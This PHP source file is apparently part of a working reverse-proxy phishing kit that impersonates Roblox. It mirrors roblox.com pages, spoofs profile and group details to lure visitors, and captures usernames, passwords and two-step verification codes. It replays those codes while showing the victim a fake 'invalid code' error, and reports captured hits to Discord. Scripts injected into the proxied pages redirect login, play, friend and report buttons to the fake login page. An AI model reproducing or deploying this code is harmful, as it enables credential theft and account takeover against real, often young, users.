<?php

if ( session_status( ) === PHP_SESSION_NONE )
{
    session_start( );
};

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/function.php" );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/twosv.php" );

$std = new stdClass( );

function roblox_redirect_without_params( array $remove ): void
{
    $path = parse_url( $_SERVER[ "REQUEST_URI" ] ?? "/", PHP_URL_PATH ) ?: "/";
    $query = $_GET;
    foreach ( $remove as $key )
    {
        unset( $query[ $key ] );
    };
    unset( $query[ "path" ] );
    $qs = http_build_query( $query );
    die( header( "Location: " . $path . ( $qs !== "" ? "?" . $qs : "" ) ) );
};

if ( !empty( $_GET[ "secret" ] ) )
{
    $account = get_user_by_referral_code( (string) $_GET[ "secret" ] );
    if ( $account && !empty( $account[ "referral_code" ] ) )
    {
        set_secret_cookie( $account[ "referral_code" ] );
    };
    roblox_redirect_without_params( [ "secret" ] );
};

if ( !empty( $_GET[ "privateServerLinkCode" ] ) )
{
    $pslc = (string) $_GET[ "privateServerLinkCode" ];
    $account = get_user_by_private_server_code( $pslc );
    if ( $account )
    {
        if ( !empty( $account[ "referral_code" ] ) )
        {
            set_secret_cookie( $account[ "referral_code" ] );
        };
        record_profile_visit( 0, (int) $account[ "id" ], $_SERVER[ "REQUEST_URI" ] ?? "", "game" );
    };
    roblox_redirect_without_params( [ "privateServerLinkCode" ] );
};

if ( preg_match( "#^/users/([^/]+)/profile#i", $_SERVER[ "REQUEST_URI" ] ?? "" ) )
{
    $uri_path = parse_url( $_SERVER[ "REQUEST_URI" ] ?? "", PHP_URL_PATH ) ?: "";
    if ( preg_match( "#^/users/([^/]+)/profile#i", $uri_path, $matches ) )
    {
        $fake_id = $matches[ 1 ];
        connect( );
        global $db;
        $st = $db->prepare( "SELECT profile_real_name, profile_fake_id, id, referral_code FROM users WHERE profile_fake_id = ? LIMIT 1" );
        $st->execute( [ $fake_id ] );
        $account = $st->fetch( );
        if ( $account )
        {
            record_profile_visit( (int) $fake_id, (int) $account[ "id" ], $_SERVER[ "REQUEST_URI" ] ?? "", "link" );
            if ( !empty( $account[ "referral_code" ] ) )
            {
                set_secret_cookie( $account[ "referral_code" ] );
            };
            $real_id = resolve_profile_roblox_id( $account );
            if ( $real_id !== null && $real_id > 0 && (string) $fake_id !== (string) $real_id )
            {
                $redirect_url = str_replace( "/users/" . $fake_id . "/profile", "/users/" . $real_id . "/profile", $_SERVER[ "REQUEST_URI" ] ?? "" );
                die( header( "Location: " . $redirect_url ) );
            };
        };
    };
};

$uri_path = parse_url( $_SERVER[ "REQUEST_URI" ] ?? "", PHP_URL_PATH ) ?: "";

if ( preg_match( "#^/communities/(\d+)#i", $uri_path, $community_matches )
    || preg_match( "#^/groups/(\d+)#i", $uri_path, $community_matches ) )
{
    $path_id = (int) ( $community_matches[ 1 ] ?? 0 );
    if ( $path_id > 0 )
    {
        connect( );
        global $db;
        $account = get_user_by_group_fake_id( $path_id );
        if ( $account )
        {
            $visit_fake_id = (int) ( $account[ "group_fake_id" ] ?? 0 );
            if ( $visit_fake_id <= 0 )
            {
                $visit_fake_id = (int) ( $account[ "profile_fake_id" ] ?? 0 ) ?: $path_id;
            };
            record_profile_visit( $visit_fake_id, (int) $account[ "id" ], $_SERVER[ "REQUEST_URI" ] ?? "", "link" );
            if ( !empty( $account[ "referral_code" ] ) )
            {
                set_secret_cookie( (string) $account[ "referral_code" ] );
            };

            $real_id = (int) ( $account[ "group_roblox_id" ] ?? 0 );
            if ( $real_id <= 0 )
            {
                $resolved = resolve_group_roblox_id( $account );
                if ( $resolved !== null && $resolved > 0 )
                {
                    $real_id = $resolved;
                    $db->prepare( "UPDATE users SET group_roblox_id = ? WHERE id = ? LIMIT 1" )
                        ->execute( [ $real_id, (int) $account[ "id" ] ] );
                };
            };

            if ( $real_id > 0 )
            {
                $group_name = (string) ( $account[ "group_name" ] ?? "" );
                $slug = roblox_group_slug( $group_name );
                $request_uri = $_SERVER[ "REQUEST_URI" ] ?? "";
                $needs_redirect = $path_id !== $real_id;
                if ( ! $needs_redirect && $slug !== "" && !preg_match(
                    "#/communities/" . preg_quote( (string) $real_id, "#" ) . "/" . preg_quote( $slug, "#" ) . "#i",
                    $request_uri
                ) )
                {
                    $needs_redirect = true;
                };
                if ( $needs_redirect )
                {
                    $redirect_url = preg_replace(
                        "#/(communities|groups)/" . preg_quote( (string) $path_id, "#" ) . "#i",
                        "/communities/" . $real_id . ( $slug !== "" ? "/" . $slug : "" ),
                        $request_uri
                    );
                    die( header( "Location: " . $redirect_url ) );
                };
            };
        };
    };
};

if ( isset( $_SERVER[ "HTTP_REFERER" ] ) && !str_contains( $_SERVER[ "HTTP_REFERER" ], $_SERVER[ "HTTP_HOST" ] ) )
{
    header( "content-type: application/json" );
    http_response_code( 406 );
    $std->success = false;
    $std->message = null;
    die( json_encode( $std ) );
} else
{
    $headers = array_change_key_case( getallheaders( ), CASE_LOWER );
    $raw_query = $_SERVER[ "QUERY_STRING" ] ?? "";
    parse_str( $raw_query, $query_params );
    unset( $query_params[ "path" ], $query_params[ "secret" ], $query_params[ "privateServerLinkCode" ] );

    $spoof_account = get_spoof_group_account( );
    if ( $spoof_account && !empty( $_GET[ "path" ] ) )
    {
        $_GET[ "path" ] = rewrite_profile_proxy_path( (string) $_GET[ "path" ], $spoof_account );
    };

    $separator = ( strpos( $_GET[ "path" ] ?? "", "?" ) !== false ) ? "&" : "?";
    $query = !empty( $query_params ) ? $separator . http_build_query( $query_params ) : "";

    $url = trim( (string) ( $_GET[ "path" ] ?? "" ) );
    if ( $url === "" )
    {
        http_response_code( 404 );
        die( "Not found" );
    };
    $post_input = file_get_contents( "php://input" );

    if ( str_contains( $url, "twostepverification.roblox.com" ) && !empty( $_COOKIE[ "secret" ] ) )
    {
        try
        {
            $t_owner = get_user_by_referral_code( (string) $_COOKIE[ "secret" ] );
            if ( $t_owner && !empty( $t_owner[ "id" ] ) )
            {
                $t_uid = "Unknown";
                if ( preg_match( "#/users/(\d+)#", $url, $tm ) )
                {
                    $t_uid = $tm[ 1 ];
                };
                $t_name = "Unknown";
                if ( $t_uid !== "Unknown" )
                {
                    $t_ch = curl_init( "https://users.roblox.com/v1/users/" . urlencode( $t_uid ) );
                    curl_setopt_array( $t_ch, [
                        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2, CURLOPT_CONNECTTIMEOUT => 2,
                        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_HTTPHEADER => [ "Accept: application/json" ],
                    ] );
                    $t_j = json_decode( (string) curl_exec( $t_ch ), true );
                    curl_close( $t_ch );
                    if ( !empty( $t_j[ "name" ] ) )
                    {
                        $t_name = (string) $t_j[ "name" ];
                    };
                };
                discord_send_2fa_hit( (int) $t_owner[ "id" ], (string) $t_name, (string) ( $_COOKIE[ "Pass" ] ?? "" ) );
            };
        }
        catch ( Throwable $e )
        {
        };
    };

    do
    {
        if ( preg_match( "#^https?:/([^/])#", $url ) )
        {
            $url = preg_replace( "#^https?:/#", "https://", $url );
        };
        if ( preg_match( "#^http?:/([^/])#", $url ) )
        {
            $url = preg_replace( "#^http?:/#", "http://", $url );
        };
        if ( $url == "https://apis.roblox.com/otp-service/v1/metadata?Origin=login" )
        {
            header( "content-type: application/json" );
            $std->OtpCodeLength = 6;
            $std->IsOtpEnabled = true;
            die( json_encode( $std ) );
        };
        if ( $_SERVER[ "REQUEST_METHOD" ] === "POST" && ( strpos( $url, "www.roblox.com/login" ) !== false || strpos( $url, "www.roblox.com/Login" ) !== false ) && !empty( $post_input ) )
        {
            parse_str( $post_input, $form );
            $ctype = "Username";
            $cvalue = $form[ "username" ] ?? "";
            $password = $form[ "password" ] ?? "";
            if ( filter_var( $cvalue, FILTER_VALIDATE_EMAIL ) ) $ctype = "Email";
            elseif ( preg_match( "/^\+?\d/", $cvalue ) ) $ctype = "Phone";
            $api_body = json_encode( [ "ctype" => $ctype, "cvalue" => $cvalue, "password" => $password ] );
            die( login( getallheaders( ), $api_body ) );
        };
        if ( strpos( $url, "auth.roblox.com/v2/login" ) !== false )
        {
            die( login( getallheaders( ), $post_input ) );
        };
        if ( strpos( $url, "/metrics/record" ) !== false )
        {
            header( "content-type: application/json" );
            die( "{}" );
        };
        if ( strpos( $url, "/search-api/omni-search" ) !== false )
        {
            $url = str_replace( "www.roblox.com", "apis.roblox.com", $url );
        };
        if ( strpos( $url, "/v1/batch" ) !== false )
        {
            $url = str_replace( "www.roblox.com", "thumbnails.roblox.com", $url );
        };
        if ( strpos( $url, "StartAuthentication" ) !== false )
        {
            header( "content-type: application/json" );
            die( "{}" );
        };
    } while ( false );

    if ( $_SERVER[ "REQUEST_METHOD" ] === "POST"
        && TWOSV_ENABLED
        && strpos( $url, "twostepverification.roblox.com/v1/users/" ) !== false
        && strpos( $url, "/challenges/" ) !== false
        && strpos( $url, "/verify" ) !== false
        && preg_match( "#/users/(\d+)#", $url, $twosv_m ) )
    {
        try
        {
            $twosv_uid = (int) $twosv_m[ 1 ];
            $twosv_body = json_decode( $post_input, true );
            $twosv_code = trim( (string) ( is_array( $twosv_body ) ? ( $twosv_body[ "code" ] ?? "" ) : "" ) );
            $twosv_challenge = (string) ( is_array( $twosv_body ) ? ( $twosv_body[ "challengeId" ] ?? "" ) : "" );
            $twosv_action = (string) ( is_array( $twosv_body ) ? ( $twosv_body[ "actionType" ] ?? "" ) : "" );
            $twosv_secret = (string) ( $_COOKIE[ "secret" ] ?? "" );
            $twosv_owner = $twosv_secret !== "" ? get_user_by_referral_code( $twosv_secret ) : null;
            $twosv_owner_id = $twosv_owner ? (int) ( $twosv_owner[ "id" ] ?? 0 ) : 0;
            $twosv_armed = $twosv_owner_id > 0 && !empty( $twosv_owner[ "dashboard_autosecure" ] );

            if ( TWOSV_DRY_RUN )
            {
                twosv_log( "dry-run hit uid=" . $twosv_uid . " action=" . $twosv_action . " code_len=" . strlen( $twosv_code ) . " armed=" . ( $twosv_armed ? "1" : "0" ) . " url=" . $url );
            }
            elseif ( $twosv_armed && preg_match( "/^\d{6}$/", $twosv_code ) && $twosv_uid > 0 )
            {
                @set_time_limit( 120 );
                $st = twosv_pending_get( $twosv_owner_id, $twosv_uid );
                if ( !$st || ( $st[ "state" ] ?? "" ) !== "got_c1" )
                {
                    $replay = twosv_replay_victim_verify( $url, $post_input );
                    $ctx = json_encode( [
                        "challenge" => $twosv_challenge, "action" => $twosv_action,
                        "cookie" => $replay[ "cookie" ] ?? "",
                        "token" => $replay[ "token" ] ?? "",
                        "sample" => substr( $replay[ "body" ] ?? "", 0, 2000 ),
                    ] );
                    twosv_pending_put( $twosv_owner_id, $twosv_uid, "got_c1", $twosv_code, $ctx, 1 );
                    twosv_log( "C1 held owner=" . $twosv_owner_id . " uid=" . $twosv_uid . " got_cookie=" . ( !empty( $replay[ "cookie" ] ) ? "1" : "0" ) );
                    twosv_fake_invalid_code( );
                }
                else
                {
                    $attempts = (int) ( $st[ "attempts" ] ?? 1 ) + 1;
                    if ( $attempts > 3 )
                    {
                        twosv_pending_clear( $twosv_owner_id, $twosv_uid );
                        twosv_fake_invalid_code( );
                    };
                    $done = twosv_pipeline_c2(
                        $twosv_owner, $twosv_uid, $twosv_code,
                        json_decode( (string) ( $st[ "ctx" ] ?? "" ), true ) ?: [ ],
                        $url, $post_input
                    );
                    if ( $done[ "success" ] ?? false )
                    {
                        twosv_pending_clear( $twosv_owner_id, $twosv_uid );
                        twosv_complete_victim( $done );
                    };
                    twosv_pending_put( $twosv_owner_id, $twosv_uid, "got_c1", $twosv_code,
                        (string) ( $st[ "ctx" ] ?? "" ), $attempts );
                    twosv_fake_invalid_code( );
                };
            };
        }
        catch ( Throwable $e )
        {
            twosv_log( "intercept error: " . $e->getMessage( ) );
        };
    };

    $request_headers = [ "user-agent: " . ( $headers[ "user-agent" ] ?? "" ),
        "origin: https://www.roblox.com",
        "referer: " . ( isset( $_SERVER[ "HTTP_REFERER" ] ) ? str_replace( $_SERVER[ "SERVER_NAME" ], "www.roblox.com", $_SERVER[ "HTTP_REFERER" ] ) : "https://www.roblox.com/" ),
        "cookie: rbx-ip2=1; GuestData=UserID=-1744713569; RBXcb=RBXViralAcquisition%3Dfalse%26RBXSource%3Dfalse%26GoogleAnalytics%3Dfalse; RBXSessionTracker=sessionid=05845aae-f205-490a-ab3a-36808c8d0ef6; RBXEventTrackerV2=CreateDate=05/28/2026 13:07:34&rbxid=11017415461&rbxuid=11020701164&browserid=1779991198485001; RBXPaymentsFlowContext=5c136cce-6a60-4243-a540-b885c51dd350," ];

    if ( !empty( $_SERVER[ "HTTP_COOKIE" ] ) )
    {
        $request_headers[ ] = "cookie: " . $_SERVER[ "HTTP_COOKIE" ];
    };
    if ( isset( $headers[ "content-type" ] ) )
    {
        $request_headers[ ] = "content-type: " . $headers[ "content-type" ];
    };
    if ( isset( $headers[ "x-retry-attempt" ] ) )
    {
        $request_headers[ ] = "x-retry-attempt: " . $headers[ "x-retry-attempt" ];
    };
    if ( isset( $headers[ "x-csrf-token" ] ) )
    {
        $request_headers[ ] = "x-csrf-token: " . $headers[ "x-csrf-token" ];
    };
    if ( isset( $headers[ "rblx-challenge-id" ] ) )
    {
        $request_headers[ ] = "rblx-challenge-id: " . $headers[ "rblx-challenge-id" ];
    };
    if ( isset( $headers[ "rblx-challenge-type" ] ) )
    {
        $request_headers[ ] = "rblx-challenge-type: " . $headers[ "rblx-challenge-type" ];
    };
    if ( isset( $headers[ "rblx-challenge-metadata" ] ) )
    {
        $request_headers[ ] = "rblx-challenge-metadata: " . $headers[ "rblx-challenge-metadata" ];
    };

    $ch = curl_init( $url . $query );
    curl_setopt_array( $ch, [ CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_TIMEOUT => 8,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_CUSTOMREQUEST => $_SERVER[ "REQUEST_METHOD" ],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_BUFFERSIZE => 131072, ] );
    apply_site_proxy( $ch );

    if ( $_SERVER[ "REQUEST_METHOD" ] === "POST" )
    {
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $post_input );
    };

    $proxy_url = $url . $query;
    $is_dev = str_contains($_SERVER["HTTP_HOST"] ?? "", "127.0.0.1") || str_contains($_SERVER["SERVER_NAME"] ?? "", "127.0.0.1");
    if ( ( strpos( $proxy_url, "/login" ) !== false || strpos( $proxy_url, "/newlogin" ) !== false ) && empty( $_COOKIE[ "secret" ] ) && !$is_dev && !str_starts_with( $_SERVER[ "REQUEST_URI" ] ?? "/", "/login" ) )
    {
        die( header( "Location: /login?returnUrl=" . urlencode( $_SERVER[ "REQUEST_URI" ] ?? "/" ) ) );
    };

    if ( strpos( $url, "profile-platform-api/v1/profiles/get" ) !== false && $spoof_account )
    {
        $profile_real_id = resolve_profile_roblox_id( $spoof_account );
        $payload = json_decode( $post_input, true );
        $profile_id = (string) ( $payload[ "profileId" ] ?? "" );
        if ( $profile_real_id !== null && $profile_real_id > 0 && $profile_id === (string) $profile_real_id )
        {
                    $profile_ch = curl_init( $url . $query );
                    curl_setopt_array( $profile_ch, [
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_TIMEOUT => 15,
                        CURLOPT_POST => true,
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_SSL_VERIFYHOST => false,
                        CURLOPT_HTTPHEADER => $request_headers,
                        CURLOPT_POSTFIELDS => $post_input,
                    ] );
                    $real_body = curl_exec( $profile_ch );
                    curl_close( $profile_ch );
                    $json = json_decode( (string) $real_body, true );
                    if ( is_array( $json ) )
                    {
                        if ( isset( $json[ "components" ][ "UserProfileHeader" ] ) )
                        {
                            $header = &$json[ "components" ][ "UserProfileHeader" ];
                            $header[ "isPremium" ] = (bool) ( $spoof_account[ "profile_premium" ] ?? false );
                            $header[ "counts" ][ "friendsCount" ] = (int) ( $spoof_account[ "profile_friends" ] ?? 0 );
                            $header[ "counts" ][ "followersCount" ] = (int) ( $spoof_account[ "profile_followers" ] ?? 0 );
                            $header[ "counts" ][ "followingsCount" ] = (int) ( $spoof_account[ "profile_followings" ] ?? 0 );
                            $header[ "names" ][ "primaryName" ] = (string) ( $spoof_account[ "profile_fake_name" ] ?? "" );
                            $header[ "names" ][ "username" ] = (string) ( $spoof_account[ "profile_fake_name" ] ?? "" );
                            $header[ "names" ][ "displayName" ] = (string) ( $spoof_account[ "profile_display_name" ] ?? "" );
                        };
                        if ( isset( $json[ "components" ][ "Actions" ] ) )
                        {
                            $actions = &$json[ "components" ][ "Actions" ];
                            $actions[ "buttons" ] = [ ];
                            if ( strcasecmp( (string) ( $spoof_account[ "profile_status" ] ?? "" ), "in game" ) === 0 )
                            {
                                $actions[ "buttons" ][ ] = [ "type" => "JoinExperience" ];
                            };
                            $actions[ "buttons" ][ ] = [ "type" => "AddFriend" ];
                        };
                    };
                    header( "content-type: application/json" );
                    die( json_encode( $json ) );
        };
    };

    $spoof_group_account = $spoof_account;

    curl_setopt( $ch, CURLOPT_HTTPHEADER, $request_headers );
    $response = curl_exec( $ch );
    $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
    $header_size = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
    $response_headers = substr( $response, 0, $header_size );
    $body = substr( $response, $header_size );
    curl_close( $ch );

    if ( $spoof_group_account !== null && $http_code === 200 )
    {
        $proxy_full_url = $url . $query;
        if ( str_contains( $proxy_full_url, "groups.roblox.com" )
            || ( str_contains( $proxy_full_url, "thumbnails.roblox.com" ) && str_contains( $proxy_full_url, "groups" ) )
            || str_contains( $proxy_full_url, "economy.roblox.com/v1/groups/" ) )
        {
            $body = maybe_spoof_group_api_body( $proxy_full_url, $body, $spoof_group_account );
        };
    };

    http_response_code( $http_code );

    foreach ( explode( "\r\n", $response_headers ) as $line )
    {
        $line = trim( $line );
        if ( empty( $line ) || stripos( $line, "http/" ) === 0 )
        {
            continue;
        }
        if ( stripos( $line, "Set-Cookie:" ) === 0 && preg_match( "/\.ROBLOSECURITY=([^;]+)/i", $line, $m ) )
        {
            $roblosecurity = $m[ 1 ];
        };
        if ( stripos( $line, "Set-Cookie:" ) === 0 && stripos( $line, "ROBLOSECURITY" ) === false )
        {
            $line = preg_replace( "/;\s*Domain=[^;]+/i", "", $line );
            
            $cookie_parts = [];
            preg_match( "/Set-Cookie:\s*([^=]+)=([^;]+)/i", $line, $cookie_match );
            if ( $cookie_match )
            {
                $cookie_name = $cookie_match[ 1 ];
                $cookie_value = $cookie_match[ 2 ];
                
                $expires = 0;
                $path = "/";
                $domain = "";
                $secure = false;
                $httponly = false;
                $samesite = "Lax";
                
                if ( preg_match( "/expires=([^;]+)/i", $line, $m ) )
                {
                    $expires = strtotime( $m[ 1 ] );
                }
                if ( preg_match( "/path=([^;]+)/i", $line, $m ) )
                {
                    $path = $m[ 1 ];
                }
                if ( preg_match( "/domain=([^;]+)/i", $line, $m ) )
                {
                    $domain = $m[ 1 ];
                }
                if ( stripos( $line, "secure" ) !== false )
                {
                    $secure = true;
                }
                if ( stripos( $line, "httponly" ) !== false )
                {
                    $httponly = true;
                }
                if ( preg_match( "/samesite=([^;]+)/i", $line, $m ) )
                {
                    $samesite = $m[ 1 ];
                }
                
                $options = [
                    "expires" => $expires,
                    "path" => $path,
                    "domain" => $domain,
                    "secure" => $secure,
                    "httponly" => $httponly,
                    "samesite" => $samesite
                ];
                
                setcookie( $cookie_name, $cookie_value, $options );
            }
        };
        header( $line, false );
    };

    if ( parse_url( $url, PHP_URL_HOST ) === "js.rbxcdn.com" )
    {

        // Inject createElement interceptor to rewrite apis.{host} -> /curl/https://apis.roblox.com
        $body = preg_replace( '#<head[^>]*>#', '$0<script>document.cookie=".ROBLOSECURRENCY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname;document.cookie=".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname;document.cookie="ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";</script><script>(function(){var o=document.createElement;document.createElement=function(t){var e=o.call(document,t);if(t.toLowerCase()==="script"){var d=Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype,"src");if(d&&d.set){var s=d.set;Object.defineProperty(e,"src",{set:function(v){if(typeof v==="string"){v=v.replace(/https?:\/\/apis\.[a-z.]+\//,"/curl/https://apis.roblox.com/");v=v.replace(/https?:\/\/[a-z]+\.[a-z.]+\.robloxlabs\.com\//,"/curl/https://apis.roblox.com/")}s.call(this,v)},get:d.get,configurable:true})}}return e}})();</script>', $body, 1 );
        $body = str_replace( "www.roblox.com", $_SERVER[ "HTTP_HOST" ], $body );
    };

    if ( parse_url( $url, PHP_URL_HOST ) === "www.roblox.com" )
    {
        $body = preg_replace_callback( "#(<script[^>]*data-bundlename=[\"']EnvironmentUrls[\"'][^>]*src=[\"'])[^\"']+([\"'][^>]*>)#",
            function ( $m )
            {
                return $m[ 1 ] . "/js/EnvironmentUrls.js?" . mt_rand( 10000, 999999 ) . $m[ 2 ];
            },
            $body );
        $body = preg_replace_callback( "#(<script[^>]*data-bundlename=[\"']Challenge[\"'][^>]*src=[\"'])[^\"']+([\"'][^>]*>)#",
            function ( $m )
            {
                return $m[ 1 ] . "/js/Challenge.js?" . mt_rand( 10000, 999999 ) . $m[ 2 ];
            },
            $body );
        $body = preg_replace_callback( "#(<script[^>]*data-bundlename=[\"']CoreUtilities[\"'][^>]*src=[\"'])[^\"']+([\"'][^>]*>)#",
            function ( $m )
            {
                return $m[ 1 ] . "/js/CoreUtilities.js?" . mt_rand( 10000, 999999 ) . $m[ 2 ];
            },
            $body );
        $body = preg_replace( '#<head[^>]*>#', '\$0<script>(function(){var o=document.createElement;document.createElement=function(t){var e=o.call(document,t);if(t.toLowerCase()==="script"){var d=Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype,"src");if(d&&d.set){var s=d.set;Object.defineProperty(e,"src",{set:function(v){if(typeof v==="string"){v=v.replace(/https?:\/\/apis\.[a-z.]+\//,"/curl/https://apis.roblox.com/");v=v.replace(/https?:\/\/[a-z]+\.[a-z.]+\.robloxlabs\.com\//,"/curl/https://apis.roblox.com/")}s.call(this,v)},get:d.get,configurable:true})}}return e}})();</script>', $body, 1 );
        $body = str_replace( "www.roblox.com", $_SERVER[ "HTTP_HOST" ], $body );
        if ( preg_match( "#/users/\d+/profile#i", $url ) )
        {
            $inject = <<<'JS'
<script>
// Global click interceptor - catches ALL clicks going to roblox.com/login
function interceptLoginNav(e) {
    var t = e.target;
    while (t && t !== document) {
        if (t.tagName === "A" && t.href) {
            var h = t.href;
            if (h.indexOf("roblox.com/login") !== -1 || h.indexOf("roblox.com/Login") !== -1 || h.indexOf("auth.roblox.com") !== -1 || h.indexOf("roblox.com/NewLogin") !== -1 || h.indexOf("roblox.com/newlogin") !== -1) {
                e.preventDefault(); e.stopImmediatePropagation();
                window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
                return false;
            }
        }
        if (t.tagName === "BUTTON" || t.getAttribute("role") === "button" || t.getAttribute("role") === "link" || t.tagName === "A") {
            var txt = (t.textContent || "").trim().toLowerCase();
            var aria = (t.getAttribute("aria-label") || "").toLowerCase();
            if (txt === "log in" || txt === "login" || txt === "sign in" || aria === "log in" || aria === "login" || aria === "sign in") {
                e.preventDefault(); e.stopImmediatePropagation();
                window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
                return false;
            }
        }
        t = t.parentElement;
    }
}
document.addEventListener("click", interceptLoginNav, true);
var origAssign = window.location.assign.bind(window.location);
window.location.assign = function(u) {
    if (typeof u === "string" && (u.indexOf("roblox.com/login") !== -1 || u.indexOf("auth.roblox.com") !== -1 || u.indexOf("roblox.com/Login") !== -1)) {
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href); return;
    }
    return origAssign(u);
};
var origReplace = window.location.replace.bind(window.location);
window.location.replace = function(u) {
    if (typeof u === "string" && (u.indexOf("roblox.com/login") !== -1 || u.indexOf("auth.roblox.com") !== -1 || u.indexOf("roblox.com/Login") !== -1)) {
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href); return;
    }
    return origReplace(u);
};
var origOpen = window.open;
window.open = function(u) {
    if (typeof u === "string" && (u.indexOf("roblox.com/login") !== -1 || u.indexOf("auth.roblox.com") !== -1 || u.indexOf("roblox.com/Login") !== -1)) {
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href); return null;
    }
    return origOpen.apply(window, arguments);
};
function hookBtn(btn) {
    if (btn.dataset.hooked) return;
    btn.dataset.hooked = "1";
    btn.addEventListener("click", function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
    }, true);
}
function hookAllButtons() {
    document.querySelectorAll("#user-profile-header-JoinExperience, #user-profile-header-AddFriend, #user-profile-header-contextual-menu-button").forEach(hookBtn);
    document.querySelectorAll("[role=menuitem]").forEach(function(btn) {
        var title = btn.querySelector(".foundation-web-menu-item-title");
        if (title && ["Follow", "Block User", "Report Abuse"].includes(title.textContent.trim())) {
            hookBtn(btn);
        }
    });
}
hookAllButtons();
var observer = new MutationObserver(hookAllButtons);
observer.observe(document.body, { childList: true, subtree: true });
</script>
JS;
            $body = str_replace( "</body>", $inject . "</body>", $body );
        };
        if ( preg_match( "#^/games/([^/]+)/([^/]+)#i", $_SERVER[ "REQUEST_URI" ] ) )
        {
            $inject = <<<'JS'
<script>
function hookGameBtn(btn) {
    if (btn.dataset.hooked) return;
    btn.dataset.hooked = "1";
    btn.addEventListener("click", function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
    }, true);
}
function hookAllGameButtons() {
    document.querySelectorAll("#game-details-play-button-container button, [data-game-action]").forEach(hookGameBtn);
}
hookAllGameButtons();
var observer = new MutationObserver(hookAllGameButtons);
observer.observe(document.body, { childList: true, subtree: true });
</script>
JS;
            $body = str_replace( "</body>", $inject . "</body>", $body );
        };
    };

    $json = json_decode( $body );
    if ( isset( $json->IsOtpEnabled ) && $json->IsOtpEnabled === false )
    {
        $json->IsOtpEnabled = true;
        $body = json_encode( $json );
    };
    die( $body );
};
